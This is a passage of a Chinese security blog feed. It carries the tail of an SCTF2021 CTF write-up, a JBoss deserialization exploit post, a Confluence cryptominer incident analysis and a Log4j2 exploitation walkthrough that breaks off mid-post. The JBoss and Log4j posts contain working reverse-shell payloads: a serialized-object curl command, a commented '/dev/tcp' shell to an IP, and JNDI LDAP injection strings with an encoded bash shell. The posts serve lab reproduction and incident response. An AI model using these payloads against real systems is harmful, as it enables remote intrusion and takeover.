class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">idString, flag := c.GetQuery(<span class="string">&quot;id&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> !flag &#123;</span><br><span class="line">idString = <span class="string">&quot;1&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">id, err := strconv.Atoi(idString)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">id = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">TargetUser := structs.Admin</span><br><span class="line"><span class="keyword">for</span> _, user := <span class="keyword">range</span> structs.Users &#123;</span><br><span class="line"><span class="keyword">if</span> user.Id == id &#123;</span><br><span class="line">TargetUser = user</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">age := TargetUser.Age</span><br><span class="line"><span class="keyword">if</span> age == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">age, flag = c.GetQuery(<span class="string">&quot;age&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> !flag &#123;</span><br><span class="line">age = <span class="string">&quot;forever 18 (Tell me the age)&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里存在一个模板渲染函数，渲染参数为age支持用户自定义输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if err != nil &#123;</span><br><span class="line">c.AbortWithError(500, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">html := fmt.Sprintf(templates.AdminIndexTemplateHtml, age)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">c.AbortWithError(500, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tmpl, err := template.New(&quot;admin_index&quot;).Parse(html)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">c.AbortWithError(500, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tmpl.Execute(c.Writer, TargetUser)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>百度一下go模板渲染方式，其实跟python的ssti很像，于是构造<code>age=&#123;&#123;.&#125;&#125;</code>直接取出flag</p><p>最终<code>payload:?id=0&amp;age=&#123;&#123;.&#125;&#125;</code></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211225103210803.png" alt="image-20211225103210803"></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="This-is-A-tree"><a href="#This-is-A-tree" class="headerlink" title="This_is_A_tree"></a>This_is_A_tree</h2><p>下载附件发现是二叉树</p><p>整理得到</p><p>左子树</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/1cscsacas.jpg" alt="1cscsacas"></p><p>右子树</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211225154423793.png" alt="image-20211225154423793"></p><p>按根节点-左节点-右节点的顺序遍历，并在又子树yEhO处分割，得到两断base64加密密文</p><p>Q2hpbmVzZSB0cmFkaXRpb25hbCBjdWx0dXJlIGlzIGJyb2FkIGFuZCBwcm9mb3VuZCEgU28gSSBXYW50IEdpdmUgWW91IE15IEZsYWcgQnV0IFlvdSBOZWVkIERlY29kZSBJdC5FbmpveSBUaGUgRmxhZyEh</p><p>OuW4iCDlhZEg5aSNIOaNnyDlt70g6ZyHIOaZiyDlp6Qg5aSn6L+HIOiuvCDlmazll5Eg6ZyHIOaBkiDoioIg6LGrIA==</p><p>解密得到：Chinese traditional culture is broad and profound! So I Want Give You My Flag But You Need Decode It.Enjoy The Flag!!:师 兑 复 损 巽 震 晋 姤 大过 讼 噬嗑 震 恒 节 豫</p><p>按伏羲六十四卦解密</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;师兑复损巽震晋姤大过讼噬嗑震恒节豫&#x27;</span></span><br><span class="line">dic=&#123;<span class="string">&#x27;坤&#x27;</span>: <span class="string">&#x27;000000&#x27;</span>, <span class="string">&#x27;剥&#x27;</span>: <span class="string">&#x27;000001&#x27;</span>, <span class="string">&#x27;比&#x27;</span>: <span class="string">&#x27;000010&#x27;</span>, <span class="string">&#x27;观&#x27;</span>: <span class="string">&#x27;000011&#x27;</span>, <span class="string">&#x27;豫&#x27;</span>: <span class="string">&#x27;000100&#x27;</span>, <span class="string">&#x27;晋&#x27;</span>: <span class="string">&#x27;000101&#x27;</span>, <span class="string">&#x27;萃&#x27;</span>: <span class="string">&#x27;000110&#x27;</span>, <span class="string">&#x27;否&#x27;</span>: <span class="string">&#x27;000111&#x27;</span>, <span class="string">&#x27;谦&#x27;</span>: <span class="string">&#x27;001000&#x27;</span>, <span class="string">&#x27;艮&#x27;</span>: <span class="string">&#x27;001001&#x27;</span>, <span class="string">&#x27;蹇&#x27;</span>: <span class="string">&#x27;001010&#x27;</span>, <span class="string">&#x27;渐&#x27;</span>: <span class="string">&#x27;001011&#x27;</span>, <span class="string">&#x27;小过&#x27;</span>: <span class="string">&#x27;001100&#x27;</span>, <span class="string">&#x27;旅&#x27;</span>: <span class="string">&#x27;001101&#x27;</span>, <span class="string">&#x27;咸&#x27;</span>: <span class="string">&#x27;001110&#x27;</span>, <span class="string">&#x27;遁&#x27;</span>: <span class="string">&#x27;001111&#x27;</span>, <span class="string">&#x27;师&#x27;</span>: <span class="string">&#x27;010000&#x27;</span>, <span class="string">&#x27;蒙&#x27;</span>: <span class="string">&#x27;010001&#x27;</span>, <span class="string">&#x27;坎&#x27;</span>: <span class="string">&#x27;010010&#x27;</span>, <span class="string">&#x27;涣&#x27;</span>: <span class="string">&#x27;010011&#x27;</span>, <span class="string">&#x27;解&#x27;</span>: <span class="string">&#x27;010100&#x27;</span>, <span class="string">&#x27;未济&#x27;</span>: <span class="string">&#x27;010101&#x27;</span>, <span class="string">&#x27;困&#x27;</span>: <span class="string">&#x27;010110&#x27;</span>, <span class="string">&#x27;讼&#x27;</span>: <span class="string">&#x27;010111&#x27;</span>, <span class="string">&#x27;升&#x27;</span>: <span class="string">&#x27;011000&#x27;</span>, <span class="string">&#x27;蛊&#x27;</span>: <span class="string">&#x27;011001&#x27;</span>, <span class="string">&#x27;井&#x27;</span>: <span class="string">&#x27;011010&#x27;</span>, <span class="string">&#x27;巽&#x27;</span>: <span class="string">&#x27;011011&#x27;</span>, <span class="string">&#x27;恒&#x27;</span>: <span class="string">&#x27;011100&#x27;</span>, <span class="string">&#x27;鼎&#x27;</span>: <span class="string">&#x27;011101&#x27;</span>, <span class="string">&#x27;大过&#x27;</span>: <span class="string">&#x27;011110&#x27;</span>, <span class="string">&#x27;姤&#x27;</span>: <span class="string">&#x27;011111&#x27;</span>, <span class="string">&#x27;复&#x27;</span>: <span class="string">&#x27;100000&#x27;</span>, <span class="string">&#x27;颐&#x27;</span>: <span class="string">&#x27;100001&#x27;</span>, <span class="string">&#x27;屯&#x27;</span>: <span class="string">&#x27;100010&#x27;</span>, <span class="string">&#x27;益&#x27;</span>: <span class="string">&#x27;100011&#x27;</span>, <span class="string">&#x27;震&#x27;</span>: <span class="string">&#x27;100100&#x27;</span>, <span class="string">&#x27;噬嗑&#x27;</span>: <span class="string">&#x27;100101&#x27;</span>, <span class="string">&#x27;随&#x27;</span>: <span class="string">&#x27;100110&#x27;</span>, <span class="string">&#x27;无妄&#x27;</span>: <span class="string">&#x27;100111&#x27;</span>, <span class="string">&#x27;明夷&#x27;</span>: <span class="string">&#x27;101000&#x27;</span>, <span class="string">&#x27;贲&#x27;</span>: <span class="string">&#x27;101001&#x27;</span>, <span class="string">&#x27;既济&#x27;</span>: <span class="string">&#x27;101010&#x27;</span>, <span class="string">&#x27;家人&#x27;</span>: <span class="string">&#x27;101011&#x27;</span>, <span class="string">&#x27;丰&#x27;</span>: <span class="string">&#x27;101100&#x27;</span>, <span class="string">&#x27;离&#x27;</span>: <span class="string">&#x27;101101&#x27;</span>, <span class="string">&#x27;革&#x27;</span>: <span class="string">&#x27;101110&#x27;</span>, <span class="string">&#x27;同人&#x27;</span>: <span class="string">&#x27;101111&#x27;</span>, <span class="string">&#x27;临&#x27;</span>: <span class="string">&#x27;110000&#x27;</span>, <span class="string">&#x27;损&#x27;</span>: <span class="string">&#x27;110001&#x27;</span>, <span class="string">&#x27;节&#x27;</span>: <span class="string">&#x27;110010&#x27;</span>, <span class="string">&#x27;中孚&#x27;</span>: <span class="string">&#x27;110011&#x27;</span>, <span class="string">&#x27;归妹&#x27;</span>: <span class="string">&#x27;110100&#x27;</span>, <span class="string">&#x27;睽&#x27;</span>: <span class="string">&#x27;110101&#x27;</span>, <span class="string">&#x27;兑&#x27;</span>: <span class="string">&#x27;110110&#x27;</span>, <span class="string">&#x27;履&#x27;</span>: <span class="string">&#x27;110111&#x27;</span>, <span class="string">&#x27;泰&#x27;</span>: <span class="string">&#x27;111000&#x27;</span>, <span class="string">&#x27;大畜&#x27;</span>: <span class="string">&#x27;111001&#x27;</span>, <span class="string">&#x27;需&#x27;</span>: <span class="string">&#x27;111010&#x27;</span>, <span class="string">&#x27;小畜&#x27;</span>: <span class="string">&#x27;111011&#x27;</span>, <span class="string">&#x27;大壮&#x27;</span>: <span class="string">&#x27;111100&#x27;</span>, <span class="string">&#x27;大有&#x27;</span>: <span class="string">&#x27;111101&#x27;</span>, <span class="string">&#x27;夬&#x27;</span>: <span class="string">&#x27;111110&#x27;</span>, <span class="string">&#x27;乾&#x27;</span>: <span class="string">&#x27;111111&#x27;</span>&#125;</span><br><span class="line">li=[]</span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="keyword">if</span> k ==<span class="number">1</span>:</span><br><span class="line">        k=<span class="number">0</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        li.append(dic[s[i]])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        t=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        t=t+s[i]+s[i+<span class="number">1</span>]</span><br><span class="line">        li.append(dic[t])</span><br><span class="line">        k=<span class="number">1</span></span><br><span class="line">ss=<span class="string">&#x27;&#x27;</span>.join(li)</span><br><span class="line"><span class="built_in">print</span>(ss)</span><br><span class="line">enc=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(ss),<span class="number">8</span>):</span><br><span class="line">    enc+=<span class="built_in">chr</span>(<span class="built_in">eval</span>(<span class="string">&#x27;0b&#x27;</span>+ss[i:i+<span class="number">8</span>]))</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br></pre></td></tr></table></figure><p> 得到flag</p><p>Ch1nA_yyds!</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://gitee.com/greetdawn/blogImages/raw/master/img/rome1920.jpg&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="安全竞赛" scheme="http://www.greetdawn.top/categories/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/"/>
    
    
    <category term="SCTF2021" scheme="http://www.greetdawn.top/tags/SCTF2021/"/>
    
    <category term="CTF" scheme="http://www.greetdawn.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>jboss反序列化(CVE-2015-7501)</title>
    <link href="http://www.greetdawn.top/2021/12/24/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2015-7501/"/>
    <id>http://www.greetdawn.top/2021/12/24/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2015-7501/</id>
    <published>2021-12-24T09:49:20.000Z</published>
    <updated>2022-02-25T16:24:46.779Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>Red Hat JBoss Application Server（AS，也称WildFly）是美国红帽（Red Hat）公司的一款基于JavaEE的开源的应用服务器，它具有启动超快、轻量、模块化设计、热部署和并行部署、简洁管理、域管理及第一类元件等特性。 红帽 JBoss A-MQ 6.x；BPM 套件 (BPMS) 6.x；BRMS 6.x 和 5.x；数据网格（JDG）6.x；数据虚拟化 (JDV) 6.x 和 5.x；企业应用平台 6.x、5.x 和 4.3.x；保险丝 6.x; 保险丝维修工程 (FSW) 6.x；运营网络（JBoss ON）3.x；传送门 6.x；SOA 平台 (SOA-P) 5.x；网络服务器（JWS）3.x；红帽 OpenShift/xPAAS 3.x；和 Red Hat Subscription Asset Manager 1.3 允许远程攻击者通过与 Apache Commons Collections (ACC) 库相关的精心设计的序列化 Java 对象执行任意命令。</p><span id="more"></span><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用 JavaDeserH2HC工具生成序列化数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line"></span><br><span class="line">java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap ip:port</span><br><span class="line"></span><br><span class="line"> curl http://vulfocus.fofa.so:38046/invoker/JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211224175451260.png" alt="image-20211224175451260"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;漏洞概述&quot;&gt;&lt;a href=&quot;#漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;漏洞概述&quot;&gt;&lt;/a&gt;漏洞概述&lt;/h2&gt;&lt;p&gt;Red Hat JBoss Application Server（AS，也称WildFly）是美国红帽（Red Hat）公司的一款基于JavaEE的开源的应用服务器，它具有启动超快、轻量、模块化设计、热部署和并行部署、简洁管理、域管理及第一类元件等特性。 红帽 JBoss A-MQ 6.x；BPM 套件 (BPMS) 6.x；BRMS 6.x 和 5.x；数据网格（JDG）6.x；数据虚拟化 (JDV) 6.x 和 5.x；企业应用平台 6.x、5.x 和 4.3.x；保险丝 6.x; 保险丝维修工程 (FSW) 6.x；运营网络（JBoss ON）3.x；传送门 6.x；SOA 平台 (SOA-P) 5.x；网络服务器（JWS）3.x；红帽 OpenShift/xPAAS 3.x；和 Red Hat Subscription Asset Manager 1.3 允许远程攻击者通过与 Apache Commons Collections (ACC) 库相关的精心设计的序列化 Java 对象执行任意命令。&lt;/p&gt;</summary>
    
    
    
    <category term="安全研究" scheme="http://www.greetdawn.top/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
    <category term="jboss" scheme="http://www.greetdawn.top/tags/jboss/"/>
    
  </entry>
  
  <entry>
    <title>记confluence的一次溯源</title>
    <link href="http://www.greetdawn.top/2021/12/17/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E8%AE%B0confluence%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BA%AF%E6%BA%90/"/>
    <id>http://www.greetdawn.top/2021/12/17/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E8%AE%B0confluence%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BA%AF%E6%BA%90/</id>
    <published>2021-12-17T03:33:39.000Z</published>
    <updated>2022-02-25T16:26:57.656Z</updated>
    
    <content type="html"><![CDATA[<p>记一次confluence挖矿溯源</p><span id="more"></span><h1 id="1、背景概述"><a href="#1、背景概述" class="headerlink" title="1、背景概述"></a>1、背景概述</h1><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled.png" alt="Untitled"></p><h1 id="2、事件分析"><a href="#2、事件分析" class="headerlink" title="2、事件分析"></a>2、事件分析</h1><p>该阿里云的系统客户部署一套了线上的confluence系统，且该系统是部署于我司的虎盾零信任安全访问系统内的，对其公网应用接口的暴露面进行了严格收敛。据得知客户在前天刚好将该收敛系统短暂暴露在公网中，增加其被攻击的可能性，导致最后被注入挖矿病毒。</p><p>前期获取客户某员工用户登录账户，获取当前使用的版本为<strong>Confluence 7.9.3</strong></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%201.png" alt="Untitled"></p><p>根据该系统版本，在互联网中发现该系统存在远程代码执行漏洞（CVE-2021-26084），且该系统漏洞在八月底被黑产大规模利用执行挖矿程序。</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%202.png" alt="Untitled"></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%203.png" alt="Untitled"></p><h1 id="3、攻击分析"><a href="#3、攻击分析" class="headerlink" title="3、攻击分析"></a>3、攻击分析</h1><p>查看系统进程，发现恶意运行进程 ps -ef</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%204.png" alt="Untitled"></p><p>根据阿里云告警提示的路径该文件创建的时间为 Dec 13 12:42</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%205.png" alt="Untitled"></p><p>下载该路径文件获取矿池地址<a href="http://j0llychic.com:9999/">j0llychic.com:9999</a></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%206.png" alt="Untitled"></p><p>获取该矿池的IP地址165.232.129.60定位为美国的一个矿池地址</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%207.png" alt="Untitled"></p><p>用户名和密码：</p><p>“user”: “47W42XBUVVm3Nwc1h6dqN9YJm8XiCR5yzBpeiWjpUdAdJdpxT4bHVnoczTDvdG1xtsF3YSD1hJviq5bLFNTPVMcj7sNKvs4”,<br>“pass”: “82b1ee75afa6”,</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%208.png" alt="Untitled"></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%209.png" alt="Untitled"></p><p>查看了一下目前恶意进程trace运行情况，该进程cpu占用率为15%，并未太高</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%2010.png" alt="Untitled"></p><p>系统日志中目前并未发现其他的可疑连接及运行进程</p><p>且confluence日志中也并未发现可疑的请求日志记录</p><p>目前大概率怀疑黑产是通过CVE-2021-26084漏洞部署的远程挖矿程序，且清空了相应的请求记录</p><h1 id="4、病毒清理"><a href="#4、病毒清理" class="headerlink" title="4、病毒清理"></a>4、病毒清理</h1><h2 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a>杀死进程</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep trace</span><br><span class="line"><span class="built_in">kill</span> -9 14387</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%2011.png" alt="Untitled"></p><h2 id="文件清理"><a href="#文件清理" class="headerlink" title="文件清理"></a>文件清理</h2><p>rm -rf /root/c3pool/</p><p>恶意进程不存在</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%2012.png" alt="Untitled"></p><p>矿池连接已不存在</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/Untitled%2013.png" alt="Untitled"></p><h1 id="5、漏洞复现"><a href="#5、漏洞复现" class="headerlink" title="5、漏洞复现"></a>5、漏洞复现</h1><p>漏洞验证，该系统存在<code>CVE-2021-26084</code></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211217113141317.png" alt="image-20211217113141317"></p><p>无虎盾收敛，应用面暴露，直接利用</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211217112917496.png" alt="image-20211217112917496"></p><p>虎盾收敛应用暴露面，已知应用和版本漏洞的情况下，未达成利用</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211217112939883.png" alt="image-20211217112939883"></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211217112948533.png" alt="image-20211217112948533"></p><h1 id="6、总结分析"><a href="#6、总结分析" class="headerlink" title="6、总结分析"></a>6、总结分析</h1><p>该客户系统部署于虎盾零信任安全产品体系下，并未遭受任何攻击，很好的对应用在公网的访问权限进行了严格限制和收敛。由于系统的短暂公网暴露，且该系统存在较新的版本漏洞，而遭受了此次严重的攻击，被黑客部署了挖矿病毒。</p><h1 id="7、防范措施"><a href="#7、防范措施" class="headerlink" title="7、防范措施"></a>7、防范措施</h1><h2 id="升级系统版本"><a href="#升级系统版本" class="headerlink" title="升级系统版本"></a>升级系统版本</h2><p>目前官方已在高版本中修复了该漏洞，请受影响的用户升级至安全版本。</p><p><a href="https://www.atlassian.com/software/confluence/download-archives">https://www.atlassian.com/software/confluence/download-archives</a></p><p>安全版本列表</p><ul><li>Atlassian Confluence Server/Data Center 6.13.23</li><li>Atlassian Confluence Server/Data Center 7.4.11</li><li>Atlassian Confluence Server/Data Center 7.11.6</li><li>Atlassian Confluence Server/Data Center 7.12.5</li><li>Atlassian Confluence Server/Data Center 7.13.0</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;记一次confluence挖矿溯源&lt;/p&gt;</summary>
    
    
    
    <category term="安全研究" scheme="http://www.greetdawn.top/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
    <category term="溯源分析" scheme="http://www.greetdawn.top/tags/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>log4j2RCE(CVE-2021-44228)漏洞利用与分析</title>
    <link href="http://www.greetdawn.top/2021/12/11/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/log4j2RCE-CVE-2021-44228/"/>
    <id>http://www.greetdawn.top/2021/12/11/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/log4j2RCE-CVE-2021-44228/</id>
    <published>2021-12-11T07:39:48.000Z</published>
    <updated>2022-02-25T16:27:03.814Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述:"></a>漏洞描述:</h2><p>Apache Log4j2 是一款开源的 Java 日志记录工具，大量的业务框架都使用了该组件。如：Apache Struts2、Apache Solr、Apache Druid、Apache Flink等。此次漏洞是用于 Log4j2 提供的 lookup 功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在实现的过程中，并未对输入进行严格的判断，从而造成漏洞的发生。</p><span id="more"></span><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围:"></a>影响范围:</h2><p>Apache Log4j 2.x &lt; 2.15.0-rc2</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h3><p>编写本地<code>exp</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// System.out.print(&quot;正在执行命令&quot;);</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            <span class="comment">// String[] commands = &#123;&quot;bash&quot;, &quot;-i&quot;, &quot;&gt;&amp;&quot;, &quot;/dev/tcp/139.196.234.164/5555 0&gt;&amp;1&quot;&#125;;</span></span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;Calc&quot;</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            System.out.println(<span class="string">&quot;正在执行命令&quot;</span>);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本地编译为<code>class</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac exp.java</span><br></pre></td></tr></table></figure><p>使用<code>marshalsec</code>本地启用恶意监听服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://192.168.1.81:8000/#exp&quot;</span> 7788</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211223155305869.png" alt="image-20211223155305869"></p><p>使用<code>Python3</code>在恶意类文件路径下启动一个简易<code>http</code>服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211223155241001.png" alt="image-20211223155241001"></p><p>插入恶意<code>payload</code>执行，触发命令执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;jndi:ldap://192.168.1.81:7788/exp&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211223155523118.png" alt="image-20211223155523118"></p><h3 id="线上靶机复现-shell反弹"><a href="#线上靶机复现-shell反弹" class="headerlink" title="线上靶机复现-shell反弹"></a>线上靶机复现-shell反弹</h3><p>使用<code>JNDI</code>启动恶意服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <span class="string">&quot;x.x.x.x&quot;</span> -p 6666</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211223155823005.png" alt="image-20211223155823005"></p><p>构造攻击payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=$&#123;jndi:ldap://x.x.x.x:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%252BJiAvZGV2L3RjcC8xMzkuMTk2LjIzNC4xNjQvNTU1NSAwPiYx&#125;</span><br></pre></td></tr></table></figure><p>注：后面command需要经过一次base64编码，两次URL编码处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command: bash -i &gt;&amp; /dev/tcp/x.x.x.x/5555 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211223160404738.png" alt="image-20211223160404738"></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211223160320680.png" alt="image-20211223160320680"></p><h3 id="线上靶机复现-回显输出"><a href="#线上靶机复现-回显输出" class="headerlink" title="线上靶机复现-回显输出"></a>线上靶机复现-回显输出</h3><p>使用<code>vulfocus</code>上的靶机测试</p><p>用<code>Log4j2 jndi injection fuzz tool</code>对主机进行模糊测试，找到传参点在<code>header</code>头</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211228131736368.png" alt="image-20211228131736368"></p><p>使用<code>JNDI</code>启动恶意服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 